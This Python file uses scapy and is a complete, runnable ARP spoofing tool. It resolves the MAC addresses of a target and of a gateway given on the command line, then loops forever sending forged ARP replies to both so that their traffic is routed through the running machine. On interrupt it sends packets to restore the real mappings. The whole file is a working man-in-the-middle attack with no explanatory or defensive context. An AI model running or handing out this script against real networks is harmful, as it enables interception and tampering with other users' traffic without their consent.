from scapy.all import *
import sys

def mac(ip):
    ether = Ether(dst = "ff:ff:ff:ff:ff:ff")
    arp = ARP(pdst = ip)

    packet = ether/arp

    answer = srp(packet, timeout = 3, verbose = 0)

    try:
        return answer[0][0][1].src
    except:
        return False


def spoof(target_ip, getawey_ip, target_mac, getawey_mac):

    ArpPacket = ARP(pdst = target_ip, hwdst = target_mac, psrc = getawey_ip, op = "is-at")

    send(ArpPacket, verbose = 0)

    my_mac = Ether().src

    print("[*] Arp Spoof {0} : {1} is-at {2}".format(target_mac, getawey_mac, my_mac))


def comin(target_ip, getawey_ip, target_mac, getawey_mac):

    ArpPacket = ARP(pdst = target_ip, hwdst = target_mac, psrc = getawey_ip, hwsrc = getawey_mac, op = "is-at")

    send(ArpPacket, verbose = 0)

    my_mac = Ether().src

    print("[+] Restoring {0} : {1} is-at {2}".format(target_mac, getawey_mac, getawey_mac))


def start(target_ip, getawey_ip):
    target_mac = mac(target_ip)
    getawey_mac = mac(getawey_ip)

    while True:
        spoof(target_ip, getawey_ip, target_mac, getawey_mac)
        spoof(getawey_ip, target_ip, getawey_mac, target_mac)



def stop(target_ip, getawey_ip):
    target_mac = mac(target_ip)
    getawey_mac = mac(getawey_ip)

    for i in range(0, 7):
        comin(target_ip, getawey_ip, target_mac, getawey_mac)


try:
    start(sys.argv[1], sys.argv[2])
except KeyboardInterrupt:
    print("[!] please waite # restoring...")
    stop(sys.argv[1], sys.argv[2])
